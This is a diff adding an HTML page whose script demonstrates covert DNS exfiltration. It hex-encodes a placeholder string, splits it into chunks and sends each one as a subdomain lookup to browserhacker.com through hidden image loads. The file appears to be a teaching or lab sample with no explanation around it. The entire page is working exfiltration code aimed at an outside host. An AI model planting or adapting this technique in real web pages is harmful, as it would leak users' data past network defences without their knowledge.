@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+</head>
+<body>
+
+<script>
+
+encode_data = function(str) 
+{ 
+	var result=""; 
+	for(i=0;i<str.length;++i) 
+	{ 
+		result+=str.charCodeAt(i).toString(16).toUpperCase();
+	} 
+	
+	return result; 
+	
+};
+
+var data = "data_to_extrude_from_client_to_server"; 
+var _encodedData_ = encodeURI(encode_data(data)); 
+console.log(_encodedData_);
+
+var max_domain_length = 255; 
+var max_segment_length = max_domain_length - "browserhacker.com".length; 
+var dom = document.createElement('b'); 
+// splits strings into chunks 
+
+String.prototype.chunk = function(n) {
+	if (typeof n=='undefined') 
+		n=100; 
+		
+	return this.match(RegExp('.{1,'+n+'}','g'));
+
+	}; 
+	
+// sends a DNS request 
+
+sendQuery = function(query) { 
+	var img = new Image; 
+	img.src = "http://"+query;
+
+	img.onload = function() { 
+		dom.removeChild(this); 
+		
+	} 
+	
+	img.onerror = function() {
+		dom.removeChild(this); 
+	} 
+	
+	dom.appendChild(img); 
+	
+}; 
+
+// Split message into segments 
+segments = _encodedData_.chunk(max_segment_length); 
+for (seq=1; seq<=segments.length; seq++) { 
+	// send segment 
+	sendQuery(seq+"."+segments.length+"." + segments[seq-1]+".browserhacker.com"); 
+}
+	
+	
+	
+</script>
+
+</body>
+</html>
